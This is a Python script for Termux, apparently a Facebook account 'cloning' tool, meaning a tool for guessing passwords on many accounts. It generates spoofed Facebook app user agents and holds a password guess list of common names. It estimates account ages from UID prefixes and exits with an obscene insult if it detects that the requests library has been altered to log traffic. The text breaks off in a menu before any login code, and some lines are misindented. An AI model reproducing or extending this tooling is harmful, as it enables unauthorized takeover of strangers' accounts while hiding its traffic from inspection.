#created by SHANTO
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit


#----------[ IMPORT LIBRARY ]---------- #
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu

#________________method__________________#
wak='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(wak+'sessions.py','r').read():
    pass
else:
    exit('\033[1;32mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
fu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(fu+'models.py','r').read():
    pass
else:
    exit('\033[1;32mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
su='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(su+'utils.py','r').read():
    pass
else:
    exit('\033[1;32mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
hu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(hu+'api.py','r').read():
    pass
else:
    exit('\033[1;32mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
nu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(nu+'auth.py','r').read():
    pass
else:
    exit('\033[1;32mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
dhon='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(dhon+'packages.py','r').read():
    pass
else:
    exit('\033[1;32mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')



sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
A = '\x1b[1;97m' 
#_______COLOUR______#
BLACK = '\x1b[1;90m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'


#
WW = '\033[97;1m' 
RR = '\033[91;1m' 
GG = '\033[92;1m' 
YY = '\033[93;1m' 
BB = '\033[94;1m'
PP = '\033[95;1m'
CC = '\033[96;1m'
NN = '\x1b[0m'
#

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;92m'
YELLOW = '\033[1;93m'
BLUE = '\033[1;94m'
ORANGE = '\033[1;95m'
BLACK = '\033[1;90m'
BS = '\033[1;96m'
HBF = '{ HBF }'
my_color = [
 RED, WHITE, BLACK, BS, GREEN, YELLOW, ORANGE]
COLOUR_X = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()

url_lookup = "https://lookup-id.com/"

url_mb = "https://mbasic.facebook.com"

url_ip = "https://www.httpbin.org/ip"

url_graph = "https://graph.facebook.com/{}"



suuu = []
samiya=[]
fahmida = []
fariya=[]


for i in range(1):
    fbs = random.choice([
        'com.facebook.adsmanager',
        'com.facebook.lite',
        'com.facebook.orca',
        'com.facebook.katana',
        'com.facebook.mlite'])
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code = str(random.randint(000000000,999999999))
    android_version = str(random.randrange(5,15))
    dens = str(random.randrange(0,5))
    xzx = random.choice(['Samsung', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A710XZ', 'Absolute', 'GT-B9120', 'GT-B9120', 'Acclaim', 'SCH-R880', 'SCH-R880', 'Admire', 'SCH-R720', 'SCH-R720', 'Amazing', 'amazingtrf', 'SGH-S730M', 'Baffin', 'baffinltelgt', 'SHV-E270L', 'Captivate Glide', 'SGH-I927 Samsung-SGH-I927', 'Captivate Glide', 'SGH-I927', 'SGH-I927', 'China Telecom', 'kylevectc', 'SCH-I699I', 'Chromebook Plus', 'kevin_cheets', 'kevin', 'Chromebook Plus', 'kevin_cheets Samsung Chromebook Plus', 'Chromebook Pro', 'caroline_cheets', 'caroline', 'Chromebook Pro', 'caroline_cheets Samsung Chromebook Pro', 'Conquer', 'SPH-D600', 'SPH-D600', 'DoubleTime', 'SGH-I857 Samsung-SGH-I857', 'Droid Charge', 'SCH-I510', 'SCH-I510', 'Elite', 'eliteltechn', 'SM-G1600', 'Elite', 'elitexltechn', 'SM-G1650', 'Europa', 'GT-I5500B', 'GT-I5500B', 'Europa', 'GT-I5500L', 'GT-I5500L', 'Europa', 'GT-I5500M', 'GT-I5500M', 'Europa', 'GT-I5503T', 'GT-I5503T', 'Europa', 'GT-I5510L', 'GT-I5510L', 'Exhibit', 'SGH-T759', 'SGH-T759', 'Galaxy (China)', 'GT-B9062', 'GT-B9062', 'Galaxy 070', 'hendrix', 'YP-GI2', 'Galaxy A', 'archer', 'archer', 'Galaxy A', 'archer', 'SHW-M100S', 'Galaxy A3 (2017)', 'a3y17lte', 'SM-A320Y', 'Galaxy A3', 'a33g', 'SM-A300H', 'Galaxy A3', 'a3lte', 'SM-A300F', 'Galaxy A3', 'a3lte', 'SM-A300M', 'Galaxy A3', 'a3lte', 'SM-A300XZ', 'Galaxy A3', 'a3lte', 'SM-A300YZ', 'Galaxy A3', 'a3ltechn', 'SM-A3000', 'Galaxy A3', 'a3ltechn', 'SM-A300X', 'Galaxy A3', 'a3ltectc', 'SM-A3009', 'Galaxy A3', 'a3ltedd', 'SM-A300G', 'Galaxy A3', 'a3lteslk', 'SM-A300F', 'Galaxy A3', 'a3ltezh', 'SM-A3000', 'Galaxy A3', 'a3ltezt', 'SM-A300YZ', 'Galaxy A3', 'a3ulte', 'SM-A300FU', 'Galaxy A3', 'a3ulte', 'SM-A300XU', 'Galaxy A3', 'a3ulte', 'SM-A300Y', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310F', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310M', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310X', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310Y', 'Galaxy A3(2016)', 'a3xeltekx', 'SM-A310N0', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320F', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320FL', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320X', 'Galaxy A5', 'a53g', 'SM-A500H', 'Galaxy A5', 'a5lte', 'SM-A500F', 'Galaxy A5', 'a5lte', 'SM-A500G', 'Galaxy A5', 'a5lte', 'SM-A500M', 'Galaxy A5', 'a5lte', 'SM-A500XZ', 'Galaxy A5', 'a5ltechn', 'SM-A5000', 'Galaxy A5', 'a5ltechn', 'SM-A500X', 'Galaxy A5', 'a5ltectc', 'SM-A5009', 'Galaxy A5', 'a5ltezh', 'SM-A5000', 'Galaxy A5', 'a5ltezt', 'SM-A500YZ', 'Galaxy A5', 'a5ulte', 'SM-A500FU', 'Galaxy A5', 'a5ulte', 'SM-A500Y', 'Galaxy A5', 'a5ultebmc', 'SM-A500W', 'Galaxy A5', 'a5ultektt', 'SM-A500K', 'Galaxy A5', 'a5ultelgt', 'SM-A500L', 'Galaxy A5', 'a5ulteskt', 'SM-A500F1', 'Galaxy A5', 'a5ulteskt', 'SM-A500S', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510F', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510M', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510X', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xeltecmcc', 'SM-A5108', 'Galaxy A5(2016)', 'a5xeltektt', 'SM-A510K', 'Galaxy A5(2016)', 'a5xeltelgt', 'SM-A510L', 'Galaxy A5(2016)', 'a5xelteskt', 'SM-A510S', 'Galaxy A5(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100X', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A510XZ', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520F', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520X', 'Galaxy A5(2017)', 'a5y17ltecan', 'SM-A520W', 'Galaxy A5(2017)', 'a5y17ltektt', 'SM-A520K', 'Galaxy A5(2017)', 'a5y17ltelgt', 'SM-A520L', 'Galaxy A5(2017)', 'a5y17lteskt', 'SM-A520S', 'Galaxy A5x(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A7', 'a73g', 'SM-A700H', 'Galaxy A7', 'a7alte', 'SM-A700F', 'Galaxy A7', 'a7lte', 'SM-A700FD', 'Galaxy A7', 'a7lte', 'SM-A700X', 'Galaxy A7', 'a7ltechn', 'SM-A7000', 'Galaxy A7', 'a7ltechn', 'SM-A700YD', 'Galaxy A7', 'a7ltectc', 'SM-A7009', 'Galaxy A7', 'a7ltektt', 'SM-A700K', 'Galaxy A7', 'a7ltelgt', 'SM-A700L', 'Galaxy A7', 'a7lteskt', 'SM-A700S', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710F', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710M', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710X', 'Galaxy A7(2016)', 'a7xeltecmcc', 'SM-A7108', 'Galaxy A7(2016)', 'a7xeltektt', 'SM-A710K', 'Galaxy A7(2016)', 'a7xeltelgt', 'SM-A710L', 'Galaxy A7(2016)', 'a7xelteskt', 'SM-A710S', 'Galaxy A7(2016)', 'a7xeltextc', 'SM-A710Y', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A7100', 'Galaxy A7(2017)', 'a7y17lte', 'SM-A720F', 'Galaxy A7(2017)', 'a7y17lteskt', 'SM-A720S', 'Galaxy A8', 'a8elte', 'SM-A800F', 'Galaxy A8', 'a8elte', 'SM-A800YZ', 'Galaxy A8', 'a8elteskt', 'SM-A800S', 'Galaxy A8', 'a8hplte', 'SM-A800I', 'Galaxy A8', 'a8hplte', 'SM-A800IZ', 'Galaxy A8', 'a8ltechn', 'SM-A8000', 'Galaxy A8', 'a8ltechn', 'SM-A800X', 'Galaxy A8', 'SCV32', 'SCV32', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810F', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810YZ', 'Galaxy A8(2016)', 'a8xelteskt', 'SM-A810S', 'Galaxy A9 Pro', 'a9xproltechn', 'SM-A9100', 'Galaxy A9 Pro', 'a9xproltesea', 'SM-A910F', 'Galaxy A9(2016)', 'a9xltechn', 'SM-A9000', 'Galaxy Ace 4 Lite', 'vivalto3g', 'SM-G313U', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HU', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HY', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313M', 'Galaxy Ace 4', 'vivaltods5m',])
    try:
        suuu.append(f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density='+dens+'.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]')
    except IndexError:
        pass
        
        
        
        
for xd in range(1):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    paku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    fahmida.append(paku2)
    
    
    a='Dalvik/2.1.0 (Linux; U; Android'
    b=random.randrange(6, 15)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    pakuu=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    fariya.append(pakuu)
    
    numan = fahmida+fariya+suuu
    





    
    
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
ct = datetime.now()
n = ct.month
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if n < 0 or n > 12:
        exit() 
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
timr = ("%s-%s-%s-%s"%(hr, ha, op, ta))
hhh=timr.upper()
tgl = ("%s %s %s"%(ha, op, ta))
#date=tgl.upper()
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

url_ip = "https://www.httpbin.org/ip"
ipm = requests.get(url_ip).json()
    
mm = ("p.facebook.com","d.facebook.com","m.facebook.com","x.facebook.com")
fg = random.choice(mm)
 
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
        
def shanto(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

 
def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.03)
#___________________PASS LIST_______________________#
xbook = []
pas = ("samiya", "lamha123", "sadiya"," fariya","nadiya","habiba","tamima","naimkhan","santohasan","emrankhan","rjfarhan","rajibhasab")
pss = ("shakib","সানজিদা","ফারজানা","তানিয়া","লামিয়া","মিম সরকার")
po = pas+pss
ppo = random.choice(po)
xbook.append(ppo)



#___________________USER AGENT____________________#
    

#for printing the ua
        
        
        
lol = (f"""\33[1;92m
  

  \033[1;91m____     _   _      _      _   _     _____   U  ___ u 
 \033[1;91m/ __"| u |'| |'| U  /"\  u | \ |"|   |_ " _|   \/"_ \/ 
\033[1;97m<\___ \/ /| |_| |\ \/ _ \/ <|  \| |>    | |     | | | | 
 \033[1;94mu___) | U|  _  |u / ___ \ U| |\  |u   /| |\.-,_| |_| | 
 \033[1;93m|____/>> |_| |_| /_/   \_\ |_| \_|   u |_|U \_)-\___/  
  \033[1;92m)(  (__)//   \\  \\    >> ||   \\,-._// \\_     \\    
 \033[1;95m(__)    (_") ("_)(__)  (__)(_")  (_/(__) (__)   (__)   
 
\033[1;93m𝙉\033[1;94m𝙊\033[1;91m𝘽\033[1;92m??\033[1;95m??\033[1;90m𝘼\033[1;92m-\033[1;91m𝙑\033[1;94m𝙄\033[1;93m𝙍\033[1;96m𝙐\033[1;95m𝙎
   
 
   \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
   ║  \x1b[97m\033[37;41m  ASKED YOU PAPA HWO I AM SHANTO   \033[0;m   \33[1;92m    ║
   \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝        """)    
                                          

def loading():
    animation = [
        '[\x1b[1;91m■\x1b[0m□□□□□□□□□]',
        '[\x1b[1;92m■■\x1b[0m□□□□□□□□]',
        '[\x1b[1;93m■■■\x1b[0m□□□□□□□]',
        '[\x1b[1;94m■■■■\x1b[0m□□□□□□]',
        '[\x1b[1;95m■■■■■\x1b[0m□□□□□]',
        '[\x1b[1;96m■■■■■■\x1b[0m□□□□]',
        '[\x1b[1;97m■■■■■■■\x1b[0m□□□]',
        '[\x1b[1;98m■■■■■■■■\x1b[0m□□]',
        '[\x1b[1;99m■■■■■■■■■\x1b[0m□]',
        '[\x1b[1;91m■■■■■■■■■■\x1b[0m]']
    for i in range(50):
        time.sleep(0.14)
        sys.stdout.write(f'''\r {N}[{H}•{N}] {H}Loading...{N} ''' + animation[i % len(animation)] + '\x1b[0m ')
        sys.stdout.flush()

        
        
        
        

os.system('clear')
print(lol)
fuckx=str(input("\033[1;91mENTER YOUR USER NAME : "))
os.system('xdg-open https://github.com/NOBITA-VIRUS-XD')
name=fuckx.upper()

jalan('\x1b[1;31mNOBITA CYBER  INFINITY CLONING START PLEASE WAIT ..........')
time.sleep(2)
os.system('clear')
loading()

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :shanto = ' √ 2009'
        elif uid[:8] in ['10000000']        :shanto = ' √ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = ' √ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
        elif uid[:6] in ['100001']          :shanto = ' √ 2010/2011'
        elif uid[:6] in ['100002','100003'] :shanto = ' √ 2011/2012'
        elif uid[:6] in ['100004']          :shanto = ' √ 2012/2013'
        elif uid[:6] in ['100005','100006'] :shanto = ' √ 2013/2014'
        elif uid[:6] in ['100007','100008'] :shanto = ' √ 2014/2015'
        elif uid[:6] in ['100009']          :shanto = ' √ 2015'
        elif uid[:5] in ['10001']           :shanto = ' √ 2015/2016'
        elif uid[:5] in ['10002']           :shanto = ' √ 2016/2017'
        elif uid[:5] in ['10003']           :shanto = ' √ 2018/2019'
        elif uid[:5] in ['10004']           :shanto = ' √ 2019/2020'
        elif uid[:5] in ['10005']           :shanto = ' √ 2020'
        elif uid[:5] in ['10006','10007','']:shanto = ' √ 2021'
        elif uid[:5] in ['10008']           :shanto = ' √ 2022'
        elif uid[:5] in ['10009']           :shanto = ' √ 2023'
        else:shanto=''
    elif len(uid) in [9,10]:
        shanto = ' √ 2008/2009'
    elif len(uid)==8:
        shanto = ' √ 2007/2008'
    elif len(uid)==7:
        shanto = ' √ 2006/2007'
    else:shanto=''
    return shanto




def clear():
    os.system('clear')




def clear():
    os.system('clear')
def banner():
    clear()
    print(f"""{GREEN}
  
    \033[38;5;46m{{𝗠}}\033[38;5;46m╔═╗╔═╗\x1b[38;5;196m╔═══╗\033[34;1m╔═╗─╔╗\033[37;1m╔══╗\033[33;1m╔═══╗\033[38;5;46m{{𝗠}} 
    \x1b[38;5;196m{{𝗢}}\033[38;5;46m║║╚╝║║\x1b[38;5;196m║╔═╗║\033[34;1m║║╚╗║║\033[37;1m╚╣╠╝\033[33;1m║╔═╗║\x1b[38;5;196m{{𝗢}}
    \033[34;1m{{𝗡}}\033[38;5;46m║╔╗╔╗║\x1b[38;5;196m║║─║║\033[34;1m║╔╗╚╝║\033[37;1m─║║─\033[33;1m║╚═╝║\033[34;1m{{𝗡}}
    \033[37;1m{{𝗜}}\033[38;5;46m║║║║║║\x1b[38;5;196m║║─║║\033[34;1m║║╚╗║║\033[37;1m─║║─\033[33;1m║╔╗╔╝\033[37;1m{{𝗜}}
    \033[33;1m{{𝗥}}\033[38;5;46m║║║║║║\x1b[38;5;196m║╚═╝║\033[34;1m║║─║║║\033[37;1m╔╣╠╗\033[33;1m║║║╚╗\033[33;1m{{𝗥}}
  \033[38;5;46m{{𝗘𝗛𝗖}}\033[38;5;46m╚╝╚╝╚╝\x1b[38;5;196m╚═══╝\033[34;1m╚╝─╚═╝\033[37;1m╚══╝\033[33;1m╚╝╚═╝\033[38;5;46m{{𝗘𝗛𝗖}}
   \033[1;93m𝐄\033[1;94m𝐇\033[1;91m𝐂\033[1;92m𝐂\033[1;95m𝐘\033[1;90m𝐁\033[1;92m-\033[1;91m𝐄\033[1;94m𝐑\033[1;93m𝟗\033[1;96m𝟗
                                                
    \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
    ║  \x1b[97m\033[37;41m  𝐓𝐄𝐀𝐌 𝐎𝐅 𝐄𝐇𝐂 𝐂𝐘𝐁𝐄𝐑𝟗𝟗\033[0;m     \33[1;92m ║
    \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
     {𝐄} ╔════════════════════════{𝐄𝐇𝐂}══════════════╗
     {𝐇}║{𝐀𝐔𝐓𝐇𝐎𝐑   :𝐄𝐇𝐂-𝐌𝐎𝐍𝐈𝐑           ║
     {𝐂}║{𝐓𝐄𝐀𝐌  : 𝐄𝐇𝐂-𝐂𝐘𝐁𝐄𝐑𝟗𝟗║
     {𝐌}║{𝐌𝐀𝐓𝐇𝐎𝐃    : 𝐀𝐋𝐋 𝐖𝐎𝐑𝐊𝐈𝐍𝐆 ║
     {𝐎}║{𝐓𝐘𝐏𝐄    : 𝐄𝐇𝐂 𝐓𝐄𝐀𝐌 𝐏𝐀𝐈𝐃 𝐂𝐇𝐔𝐃𝐄𝐍𝐀 ║
     {𝐍}║{𝐕𝐄𝐑𝐓𝐈𝐎𝐍   : 2.1.1                  """)


    

    
#---------------------[LOOP MENU]---------------------#
loop = 0
ok = []
lok = []
twf = []
uid = []


    

def main():
    os.system('clear')
    print(lol)
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] 𝐓𝐎𝐎𝐋 𝐍𝐄𝐌𝐄 : 𝐄𝐇𝐂')
    print(f'{M}║══[•] 𝐘𝐎𝐔𝐑 𝐈𝐏  :{H} '+IP)
    print(f'{M}║══[•] 𝐕𝐄𝐑𝐓𝐈𝐎𝐍   : 𝟗.𝟗')
    print(f' ')
    print(f"{M}╔══[{M}𝟏{RED}] \033[1;32m𝐒𝐓𝐀𝐑𝐓 𝐈𝐍𝐅𝐈𝐓𝐘 𝐂𝐋𝐎𝐍𝐈𝐍𝐆{RED}(TCW)")
    print(f"║══[{M}𝟐{RED}] \033[1;34m𝐉𝐎𝐈𝐍 𝐌𝐘 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐂𝐇𝐀𝐍𝐄𝐋[<\>] {RED}(FIRST)")
    print(f"║══[{M}𝟑{RED}] \033[1;35m𝐄𝐗𝐈𝐓 [<\>] ")
    print(f"{RED}╚══[{M}U{RED}] \033[1;31m𝐔𝐏𝐃𝐀𝐓𝐄 𝐏𝐑𝐎𝐆𝐑𝐀𝐌 ")
    sh = input("    \033[0;91m(#)\033[0;92m 𝐂𝐇𝐎𝐎𝐂𝐄 : ")
    if sh =='1':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100092161153653')
       _xxx_()
    if sh =='2':
       os.system('xdg-open https://t.me/EMRAN99EHCfree')
       main()
    if sh =='3':
       os.system('xdg-open https://t.me/EMRANEHCCYBER99PYTHONCODING ')
       main()
    else:
        os.system('xdg-open https://www.facebook.com/groups/2740586426083467/?ref=share')
        main()
        
def _xxx_():
    os.system('clear')
    print(lol)
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] 𝐓𝐎𝐎𝐋 𝐍𝐀𝐌𝐄: {H}𝐄𝐇𝐂')
    print(f'{M}║══[•] 𝐘𝐎𝐔𝐑 𝐈𝐏  :{H} '+IP)
    print(f'{M}║══[•] 𝐕𝐄𝐑𝐓𝐈𝐎𝐍   : {H}𝟗.𝟗')
    print(f'{M}╚══[•] 𝐓𝐄𝐀𝐌 𝐎𝐅: {H}𝐄𝐇𝐂-𝐂𝐘𝐁𝐄𝐑𝟗𝟗')
    print(f' ')
    print(f"{M}╔══[{M}𝟏{RED}] \033[1;32m𝐒𝐓𝐀𝐑𝐓 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐈𝐍𝐆{RED}(TCW)")
    print(f"{M}╔══[{M}𝟐{RED}] \033[1;31m𝐒𝐓𝐀𝐑𝐓 𝐆𝐌𝐀𝐈𝐋 𝐂𝐋𝐎𝐍𝐈𝐍𝐆{RED}(TCW)")
    print(f"║══[{M}𝟑{RED}] \033[1;34m𝐅𝐋𝐋𝐎𝐖 𝐌𝐘 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌[<\>] {RED}(FIRST)")
    print(f"║══[{M}𝟒{RED}] \033[1;35m𝐁𝐀𝐂𝐊 [<\>] ")
    print(f"{RED}╚══[{M}U{RED}] \033[1;31m𝐔𝐏𝐃𝐀𝐓𝐄 ")
    sh = input("    \033[0;91m(#)\033[0;92m 𝐂𝐇𝐎𝐎𝐂𝐄 : ")
    if sh =='1':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100092161153653')
       _pornhub_()
    if sh =='2':
      os.system('xdg-open https://t.me/EMRANEHCCYBER99PYTHONCODING')
       _xnxx_()
    if sh =='3':
       os.system('xdg-open https://t.me/EMRAN99EHCfree')
       main()
    else:
      os.system('xdg-open https://www.facebook.com/groups/2740586426083467/?ref=share')
        main()
        
def _xnxx_():
    os.system('clear')
    loading()
    banner()
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] 𝐓𝐎𝐎𝐋 𝐍𝐀𝐌𝐄: {H}𝐄𝐇𝐂')
    print(f'{M}║══[•] 𝐘𝐎𝐔𝐑 𝐈𝐏   :{H} '+IP)
    print(f'{M}║══[•] 𝐕𝐄𝐑𝐓𝐈𝐎𝐍   : {H}𝟗.𝟗')
    print(f'{M}╚══[•] 𝐓𝐄𝐀𝐌 𝐎𝐅: {H}𝐄𝐇𝐂 𝐂𝐘𝐁𝐄𝐑𝟗𝟗')
    print(f" ")
    print(f"{RED}╔══[{M}𝟏{M}] {RED}𝐑𝐀𝐍𝐃𝐎𝐌 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 {RED} (MIX) ")
    print(f"║══[{M}𝟐{RED}] {GREEN}𝐑𝐀𝐍𝐃𝐎𝐌 𝐆𝐌𝐀𝐈𝐋 𝐂𝐋𝐎𝐍𝐄{RED}[>/]")
    print(f"║══[{M}𝟑{RED}] {BLACK}𝐅𝐋𝐋𝐎𝐖 𝐌𝐘 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐂𝐇𝐄𝐍𝐄𝐋{RED}[>/]")
    print(f"║══[{M}F{RED}] {BLACK}𝐅𝐋𝐋𝐎𝐖 𝐌𝐄 𝐎𝐍 𝐅𝐁{RED} ")
    print(f"╚══[{M}U{RED}] {BLACK}𝐔𝐏𝐃𝐀𝐓𝐄 ")
    sh = input("    \033[0;91m(#)\033[0;92m 𝐂𝐇𝐎𝐎𝐂𝐄 : ")
    if sh =='1':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100092161153653')
       user()
    if sh =='2':
